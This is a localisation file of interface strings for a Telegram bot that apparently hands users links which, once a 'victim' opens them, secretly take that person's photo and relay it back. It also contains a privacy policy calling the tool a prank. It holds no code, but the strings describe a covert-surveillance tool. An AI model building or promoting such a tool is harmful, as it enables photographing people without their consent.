-accept-policy-message = <i>By using this bot, you agree to our /privacy policy!</i>

start-command =
    { -accept-policy-message }

    Send one of the links below to your victim to snap a secret photo 📸

disable-group-chats-event =
    .message = Unfortunately, I am only available in private chats 🙁
    .button = 🔗 Get your unique link

my-chat-member-event =
    ⚠️ <b>WARNING</b> ⚠️

    You have restricted me from sending photos!

    Please note, <b>I can't function properly without this permission!</b>

privacy-policy-command =
    <b>Privacy policy:</b>

    1. This bot is exclusively intended <b>ONLY</b> for: pranks/jokes, and/or controlled testing scenarios.

    2. Don't share the link with someone you don't know.

    3. The bot and its associated website <b>DO NOT</b> store any user data other than user ID. The bot <b>DOES NOT store any photos</b>! The workflow is as follows: website => bot => end user.

    4. It is strictly forbidden to share a link requesting anything prohibited by Telegram rules or the law. After receiving a photo, you may send it for inspection. In case of violation, the IP of the sender who sent the photo will be blocked!

    5. False complaints clogging our system are strictly prohibited and strongly punished.

    6. The bot is not intended to be used as a weapon for hacking. Respect other users and their privacy.

    { -accept-policy-message }

    { $url }
